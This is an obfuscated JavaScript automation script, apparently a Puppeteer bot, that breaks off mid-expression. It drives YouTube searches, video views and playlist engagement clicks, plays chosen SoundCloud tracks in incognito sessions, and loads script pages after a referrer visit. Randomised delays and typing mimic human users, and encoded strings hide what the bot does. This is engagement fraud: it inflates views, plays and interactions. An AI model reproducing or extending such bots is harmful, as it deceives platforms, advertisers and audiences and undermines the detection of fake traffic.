const Y = b,
  X = c,
  W = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xe33 + -0x1 * -0x1475 + -0x22a7))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x107e + -0x237d + 0x33fb), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x5acd * -0x1 + -0xe4ad + 0xff10 + (-0xf59 * 0x1 + -0x6 * 0x236 + 0xeb * 0x5f) * random()) : await standardWaitForNetIdle(f), await wait(0x862 + -0xd90 * -0x2 + -0xffa + (0x99b * 0x3 + -0x3 * 0x12ee + 0x4309) * random()), 0x2 * -0x6e3 + -0x244b + 0x1 * 0x3212;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1065 + 0xf * -0x12 + 0x1173);
    let h = e[f];
    if (b['LPEvhf'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x114d * -0x1 + 0x28 * 0x1b + 0xd15, s, t, u = 0x1 * -0x222 + -0x1f1f + 0x2141 * 0x1; t = n['charAt'](u++); ~t && (s = r % (-0x17b0 + 0x1c57 + -0x4a3) ? s * (-0x237d + -0x112d + -0x34ea * -0x1) + t : t, r++ % (0x1bdb + -0x20ba + 0x4e3)) ? p += String['fromCharCode'](-0x46c + -0x1 * -0x9ad + 0x6d * -0xa & s >> (-(0x862 + -0xd90 * -0x2 + -0x2380) * r & 0xd9 * 0x11 + -0x3 * 0x977 + 0xe02)) : 0x2 * -0x6e3 + -0x244b + 0x1 * 0x3211) {
          t = o['indexOf'](t);
        }
        for (let v = -0x4 * -0xc1 + -0x1189 + 0xe85, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1e7f + 0x57d + 0x1912))['slice'](-(-0x60 * -0x65 + 0xb3 * 0x1b + -0x38bf));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1b4e + -0x1ef3 + 0x3a41,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * -0x1226 + -0xb69 + 0x1d8f; u < 0x17 * -0x7c + -0x36c + 0xf90; u++) {
          p[u] = u;
        }
        for (u = 0x3ee + 0xe74 + 0x2 * -0x931; u < 0x4d6 * -0x4 + -0x19d9 + -0x93d * -0x5; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x121d * 0x1 + 0x1 * -0xa51 + -0x6cc), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xabf + -0xbe1 * -0x1 + -0x16a0, q = -0x2365 + -0x77 * 0x5 + 0x25b8;
        for (let v = -0x1 * 0x295 + -0x8fa + 0xb8f; v < n['length']; v++) {
          u = (u + (0x1870 + -0x1 * 0x16ae + -0x1 * 0x1c1)) % (-0x423 * 0x1 + 0x2 * 0x11c5 + -0x2b * 0xb5), q = (q + p[u]) % (0x6 * -0x4f + -0xd * 0x10c + -0x62 * -0x2b), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x645 * 0x1 + 0x4 * -0x28d + -0x1 * -0x4ef)]);
        }
        return t;
      };
      b['lwyTkN'] = m, c = arguments, b['LPEvhf'] = !![];
    }
    const j = e[-0x73c + 0x24ac + -0x1d70],
      k = f + j,
      l = c[k];
    return !l ? (b['BSaUlN'] === undefined && (b['BSaUlN'] = !![]), h = b['lwyTkN'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function a() {
  const bm = [
    'https://ww',
    'fakebrowse',
    'Bw9VBw9VlMLVia',
    'pts/30310-',
    'Ahr0Chm6lY9Tzq',
    'ALSZnqQTuJ',
    'n0rQt3bFsK0YwG',
    '\x20new\x20updat',
    'D0O/W5/dKapcTmoMW7JdIG',
    'Dg1FC291CMnLpq',
    '6s8Xm4wylr',
    'W6qMgr4aWQ8NimoAWPS',
    'lw1Vzc1JywXPyG',
    'WQChsq',
    'Kit/537.36',
    'url',
    'PZ_uLi7ULl',
    'zgL1Bs5JB20Vzq',
    't/537.36\x20(',
    ',moomoo.io',
    'lwnOAwXKkdeP',
    'rg/en/scri',
    'zY1bANu4EhjYtW',
    'WRhcLGmr',
    'timeout',
    'CmoMuSoSW7RcPmkIjSkRWOy',
    'listen',
    'W63cPCk7s8kzWPSJWQflrW',
    'RBSHAH4iWU',
    'com?page=9',
    'ial_sharin',
    'browser\x20la'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x4 * -0xc1 + -0x1189 + 0x220d), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1e7f + 0x57d + 0x1903;
}
async function randomWait() {
  return await wait(-0x60 * -0x65 + 0xb3 * 0x1b + -0x2539 + (-0x1b4e + -0x1ef3 + 0x4dc9) * random()), 0x1 * -0x1226 + -0xb69 + 0x1d90;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x17 * -0x7c + -0x36c + 0xe90, 0x3ee + 0xe74 + 0x1 * -0x125b), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xda7 * -0x11 + -0x13623 + -0x564a * -0x9) * getRandomInt(0x121d * 0x1 + 0x1 * -0xa51 + -0x7ca, 0xabf + -0xbe1 * -0x1 + -0x169b), h)), -0x2365 + -0x77 * 0x5 + 0x25b9;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * 0x295 + -0x8fa + 0xb8f;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1870 + -0x1 * 0x16ae + -0x1 * 0x1c1]['split']('\x20');
    for (let k = -0x423 * 0x1 + 0x2 * 0x11c5 + -0x1 * 0x1f67; k < i['length']; k += 0x6 * -0x4f + -0xd * 0x10c + -0x63 * -0x28)
      j += i[k] * h[i[k + (0x645 * 0x1 + 0x4 * -0x28d + -0x3 * -0x150)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = c;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + R(0x14)), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x73c + 0x24ac + -0x1d6a)['map'](l => Array['from'](l['children']))['flat'](0x23f3 * 0x1 + 0x1232 * -0x2 + 0x72)['map'](l => l['childNodes'][0x8b9 + 0x16d9 + -0x1f91]['childNodes'][0x95 + -0x2092 + 0x1ffd]['childNodes'][0x21eb + 0x13d4 + -0x35be * 0x1]['childNodes'][0x266 * -0x5 + 0x7 * -0xb2 + 0x10dc]['childNodes'][0x4 * -0x7e3 + 0x1b * -0xac + -0x1 * -0x31b1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j[S(0xd, 'hw#v')](l => l['href']);
  }), await wait(getRandomInt(-0x1cd + 0x25a4 + -0x1fef, -0x23 * -0x14 + -0x2019 + -0x1 * -0x30e5)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x21 * 0xd5 + 0x602 * -0x4 + 0x6e15);
  const h = await getMaxTime(f),
    i = Math['min']((-0x84a * 0x3 + -0x38df + -0x19f * -0xc3) * getRandomInt(-0x5e * 0x2d + 0x1e63 + -0xddb, -0xdf4 + -0x10 * 0x262 + 0x3419), h);
  return await wait(i), -0xd * -0x48 + 0x1692 + -0x7 * 0x3bf;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x479 + 0x1 * 0x17b + -0x17f * -0x2]['children'][-0x665 + 0x1 * 0x16af + 0x5 * -0x342]['children'][0x1 * 0xeae + -0x1 * 0x2507 + 0x1659 * 0x1]['children'][-0x1c3 + 0x1 * 0x10a5 + -0xee2]['children'][0x63b * -0x4 + -0x1 * -0x2092 + -0xb2 * 0xb]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1c87 + -0x1cac + -0x416 * -0xe;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1065 + 0xf * -0x12 + 0x1173);
    let h = e[f];
    if (c['pjhhDi'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x114d * -0x1 + 0x28 * 0x1b + 0xd15, r, s, t = 0x1 * -0x222 + -0x1f1f + 0x2141 * 0x1; s = m['charAt'](t++); ~s && (r = q % (-0x17b0 + 0x1c57 + -0x4a3) ? r * (-0x237d + -0x112d + -0x34ea * -0x1) + s : s, q++ % (0x1bdb + -0x20ba + 0x4e3)) ? o += String['fromCharCode'](-0x46c + -0x1 * -0x9ad + 0x6d * -0xa & r >> (-(0x862 + -0xd90 * -0x2 + -0x2380) * q & 0xd9 * 0x11 + -0x3 * 0x977 + 0xe02)) : 0x2 * -0x6e3 + -0x244b + 0x1 * 0x3211) {
          s = n['indexOf'](s);
        }
        for (let u = -0x4 * -0xc1 + -0x1189 + 0xe85, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1e7f + 0x57d + 0x1912))['slice'](-(-0x60 * -0x65 + 0xb3 * 0x1b + -0x38bf));
        }
        return decodeURIComponent(p);
      };
      c['EhxgTr'] = i, b = arguments, c['pjhhDi'] = !![];
    }
    const j = e[-0x1b4e + -0x1ef3 + 0x3a41],
      k = f + j,
      l = b[k];
    return !l ? (h = c['EhxgTr'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x204b + 0x152e + 0x1 * 0xb81 + (-0x1 * -0x11f2 + 0x25cf + -0x1af * 0x21) * random()
  }), await wait(0x106d + -0x8eb * 0x3 + -0xc * -0x106 + (0x902 + 0x19d1 * -0x1 + 0x11fb) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x25 * 0xef + -0x1f56 + -0x333]['childNodes'][-0x1e51 + 0x189 + -0x1cc9 * -0x1]['childNodes'][-0x20eb + -0x1208 * -0x1 + 0xee4]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1403 + -0x105a + -0x1 * 0x3a4]['childNodes'][0x1220 + -0x1d9d + 0xb7d * 0x1]['childNodes'][-0x1f74 + 0x1 * 0x803 + 0x57 * 0x45]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x22ab + 0x1 * 0x1136 + 0x50 * -0xa6),
          r = 0x15c5 * 0x1 + 0x1 * 0x1ce1 + 0x10e2 * -0x3;
        for (let u = -0x4 * -0x70 + -0x349 * 0x9 + 0x1bd1; u < q['length']; u += 0x54b + 0x276 + -0x3 * 0x295)
          r += q[u] * k[q[u + (-0x131 + -0x382 + 0x4b4)]];
        return r;
      }(n);
  });
  await wait((0x79 + 0x34c7 * -0x1 + 0xa7 * 0xaa) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x2 * 0x5d6e + -0xcef0 + 0x24 * 0x1173) * getRandomInt(-0x2253 + -0x827 + 0x2a7b, 0x21d * 0x11 + 0x26ad + -0x10 * 0x4a9), h + (0x1b03 + 0x1 * 0x43b + -0x1 * 0xbb6));
  return await wait(i), 0xd * -0x252 + 0x1 * 0x16db + 0x3 * 0x270;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x23eb + -0x102f + 0x2 * -0x9de), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x3 * -0x629 + -0x53b + -0x62 * 0x4 + (-0xd2a + 0x19db * 0x1 + 0xad * -0xd) * Math['random']());
    });
  }, 0x2 * 0xe44 + 0x22d5 + 0x2405 * -0x1);
  await wait(-0x83c06 + -0x23097 * -0x1 + 0xa9f4f);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1197e + -0xf0b * 0x1d + 0x18521) * getRandomInt(-0x1079 * -0x1 + 0x167f + -0x9 * 0x454, -0x1232 + 0xbe7 + -0x332 * -0x2)), clearInterval(h), -0xde7 + -0x12c + 0xf14;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1065 + 0xf * -0x12 + 0x1173);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1d88 + 0x775 * 0x5 + -0x42d1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xda6 + 0x74c * -0x2 + 0x1c3f * 0x1;
    await randomWait();
  }
  return 0x1d68 * 0x1 + 0x1955 + -0x3e * 0xe2;
}

function fetchRandomSC() {
  const U = d,
    T = c;
  return Math['random']() <= 0xd78 + 0x101d + -0x1d95 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x946 + 0x1682 + -0x1fc8 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + T(0x9) + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + U(0x1e) + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xe5d * -0x1 + -0x2c7 * -0x9 + -0x1 * 0xaa2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x375 * -0x8 + -0x435 * 0x1 + 0x1fdd;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1a5 + -0x8d8f + 0x13bb2 * 0x1 + getRandomInt(-0x5f4e + -0x4799 + 0xe17f * 0x1, -0xb62c + 0x301d + 0xfb3f));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x10c9 * -0x1 + -0x1091 + 0x215b), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x4 * -0x618 + 0xba7 * -0x2 + 0x2fae;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x16f3 + 0x1995 + 0x2a2 * -0x1, -0x14ff + -0x145a + -0x5 * -0x84f)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x17b6 + -0x172f + -0x1 * -0x36b5 + floor((0x75b + -0x1709 * -0x1 + -0x1a7c * 0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x29ff996e + -0x9fd9d600 + 0x149d96f6e),
          0x12 * -0xbc3cd + 0x20b0 * -0x2d5 + -0xbaf52 * -0x25,
          -0xd2dc + -0xe62 + 0x1613e,
          -0x17ca + 0x18d + 0x16bd
        ], y = [
          0x236b + 0x518 + 0x1 * -0x286b,
          0x1791 + 0x1514 * 0x1 + -0x2c95,
          -0x1 * 0x2515 + -0xc27 + 0x3144,
          0x2220 + 0xd9 * -0x2e + 0x4de
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0xb3 * -0x1f + -0x1 * 0x481 + -0x112b)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x16 * -0x176 + 0xe * -0x47 + 0x2406; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xdd + 0x31 * -0xa7 + 0xa5e * 0x3) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x639 + 0x2694 + -0x2ccd] = A[-0x31 * -0x91 + 0x202 * 0xd + -0x35cb] = A[-0x2377 * 0x1 + -0x1 * 0x2404 + 0x3 * 0x17d4] = A[0xd * -0x70 + -0x77 * 0x3 + 0x717] = A[0x1 * -0xb3 + 0xc83 * 0x1 + -0xbcd] = A[-0x72 + -0x19e6 + 0x3c4 * 0x7] = A[-0x92e + 0x1bb + -0x4 * -0x1de] = A[0xc41 * 0x1 + -0x1 * 0x18d7 + 0xc9c] = A[0x12aa + -0x22b0 + 0x24b * 0x7] = A[-0x50 * -0xf + -0x17de + 0x1336] = A[-0x9 * 0x23d + 0x881 * 0x4 + -0xdd6] = A[-0x1 * 0x1b26 + 0x2239 + -0x709] = A[-0x861 * 0x4 + -0x20ee + 0x1 * 0x427d] = A[0xea9 + -0x682 + 0x1 * -0x81b] = A[-0xd5 * 0x13 + -0x18f9 + -0x28d5 * -0x1] = A[0x1b6c + 0x7 + -0x1b65] = A[0xe73 + -0x1e78 + -0x4 * -0x405] = 0x2251 + 0xdf9 + -0x304a, this['blocks'] = A) : this['blocks'] = [
                0x1d * 0xb6 + 0x26e7 + -0x3b85,
                -0x1 * -0xb5c + 0xd * 0x12f + -0x1abf,
                0x230 + 0x1005 * -0x1 + 0xdd5,
                -0x2492 + -0xbae + 0x3040,
                0x2673 + -0x1b96 + 0x1 * -0xadd,
                0xf32 + 0x1 * 0x26 + -0x1eb * 0x8,
                0xb68 + 0x67 * 0x17 + -0x2b * 0x7b,
                0xc09 * 0x3 + 0x534 + 0x843 * -0x5,
                0xf0d + -0x82f * 0x1 + -0x6de,
                -0x2239 + -0x1 * -0x123 + 0x6e * 0x4d,
                0x1 * 0x1e0b + 0x151c + -0x3327,
                -0x6ee * -0x1 + 0x85 * 0x1b + -0x5 * 0x431,
                0x2152 + -0xf3 * 0x1f + -0x3e5,
                -0x7cf * 0x1 + -0xb2a + -0x653 * -0x3,
                -0x3e6 * 0x5 + -0x170 + -0x5e * -0x39,
                0x8bf + 0xb0 * -0xa + -0x1df,
                -0x13b9 + -0x1d * -0xbb + -0x176
              ], this['h0'] = -0x1 * -0x2d9e1fc5 + -0xb762 * 0x2a93 + 0x1 * 0x58266482, this['h1'] = 0x1476b5bc8 + 0x19ebf71 * -0x2f + -0xb788a80, this['h2'] = 0x683017a3 + 0x11951c95 * 0xe + -0xc59ccacb, this['h3'] = -0x669590f + -0x65 * 0x2b9b13 + 0x27cfdc04, this['h4'] = -0x217a * 0x3909b + 0xdc57d9fe + 0x89eb870 * 0xb, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x8e6 * -0x2 + 0x221c + -0x33e8, this['finalized'] = this['hashed'] = 0x3e3 + 0xe52 + -0x1235, this['first'] = 0x1168 * 0x1 + 0xbeb + -0x1d52;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1021 * -0x2 + -0x8 * 0x29b + 0x351a, O = J['length'] || -0x176d + 0x19f0 + -0x283, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xd8 + -0x225 + 0x2fd, P[0x233 + -0x39f + 0x16c] = this['block'], P[-0xe9 * 0x14 + -0x1f1 + 0x1435] = P[-0x11e3 + -0x3 * -0xcb9 + 0x1 * -0x1447] = P[0x1409 + 0x4 * 0x5cf + -0x2b43 * 0x1] = P[-0x18e7 + -0x1dac + 0x3696] = P[0x127a + -0x1d * -0x129 + -0x1 * 0x341b] = P[-0xd * 0x209 + -0x2470 + 0x3eea] = P[0x46f + -0x1b81 + 0x1718] = P[-0x22b8 + 0x4e9 + 0x1dd6] = P[-0xb1 * 0x15 + -0x7e * 0x11 + 0x1 * 0x16eb] = P[-0x3 * -0xa31 + -0x225b + -0x1 * -0x3d1] = P[0x1069 * 0x2 + 0x1 * 0x16df + 0x128d * -0x3] = P[-0x1 * -0x160d + 0x417 + 0x1 * -0x1a19] = P[0x1d0e + -0x206 + 0x6bf * -0x4] = P[0x17 * -0xc7 + -0x1f3c + 0x312a] = P[-0x6f0 + 0x7 * -0x2cf + 0x1aa7] = P[0x667 + -0x2241 + -0x595 * -0x5] = 0x7 * 0x68 + -0x4cc + 0x1f4), K) {
                    for (N = this['start']; M < O && N < 0x18d * 0x2 + 0xd8 * -0x1f + -0x9d * -0x26; ++M)
                      P[N >> -0x11 * 0xdd + -0x11b * -0xf + -0x6 * 0x51] |= J[M] << y[0xeae + -0x9 * -0x5b + -0x11de & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xdd5 + -0x2106 + 0x2f1b; ++M)
                      (L = J['charCodeAt'](M)) < 0x1 * 0x1c76 + -0x13b3 + 0x1a7 * -0x5 ? P[N >> -0x5 * -0x1bb + -0xa51 * 0x3 + -0x5 * -0x476] |= L << y[0x1 * -0x1cde + -0xa04 * -0x2 + -0x97 * -0xf & N++] : L < 0x313 * -0x1 + 0x1 * -0x11e5 + 0x1cf8 ? (P[N >> 0x22 * 0x3 + -0xd * -0x10f + 0x1 * -0xe27] |= (0xc5b + 0x2a1 * 0x1 + 0x4 * -0x38f | L >> -0x900 * -0x2 + 0x56 * -0x6e + 0x12fa) << y[-0xc47 * -0x3 + -0x1dd4 + -0x6fe & N++], P[N >> -0x2040 + 0x4e0 + 0x1b62] |= (-0xdab + 0x14 + 0xe17 | -0x2684 + -0xdbd + 0x3480 & L) << y[0xe3a + 0x3 * -0x44d + 0xc * -0x1c & N++]) : L < -0x2 * -0x83b1 + -0x470c + 0x2 * 0xbd5 || L >= -0x4 * 0x1952 + -0x163ce + 0x2 * 0x1548b ? (P[N >> 0x1083 + 0x4 * -0x981 + 0x1583] |= (0x11 * 0x189 + -0x25e7 + 0x1 * 0xcae | L >> 0x1c66 + -0x1355 + -0x905) << y[-0x18de + -0x1d93 + 0x3674 & N++], P[N >> 0x126e + -0x12d * 0xe + -0x1f6] |= (0x925 * -0x2 + -0xa3b + -0x13 * -0x187 | L >> -0x1 * -0x15ce + 0x21eb + 0x1 * -0x37b3 & -0x2191 + -0xcda + 0x2eaa) << y[0x7 * 0x547 + 0x1 * -0x1443 + -0x10ab & N++], P[N >> 0x1 * 0x222e + 0x2 * 0xf23 + 0x2039 * -0x2] |= (0x1 * -0x259f + 0x1 * -0xeb7 + 0x34d6 * 0x1 | -0x1 * -0x1101 + -0x270b + 0x1649 & L) << y[-0x1cf * -0x8 + 0x23ea + -0x1 * 0x325f & N++]) : (L = -0x59ec + 0x9 * -0x1cb5 + 0x1 * 0x25c49 + ((-0x22ee + 0x26 * -0x39 + 0x2f63 & L) << -0x57b + -0x1715 + 0x20b * 0xe | -0x1088 + 0x11b * -0x22 + 0x3a1d & J['charCodeAt'](++M)), P[N >> 0xacb + 0x1 * 0x198f + -0x2458] |= (-0x1eb + 0x2 * 0xb9a + -0x1459 | L >> 0x6b * 0x1 + 0x5 * -0x8c + 0x1 * 0x263) << y[-0x1 * -0x10f + -0x1381 + -0x87 * -0x23 & N++], P[N >> 0xe03 + -0x117d + 0x37c] |= (0x1168 + -0x4 * -0x6ef + -0x2ca4 | L >> 0x131c + -0x96b + -0x9a5 & 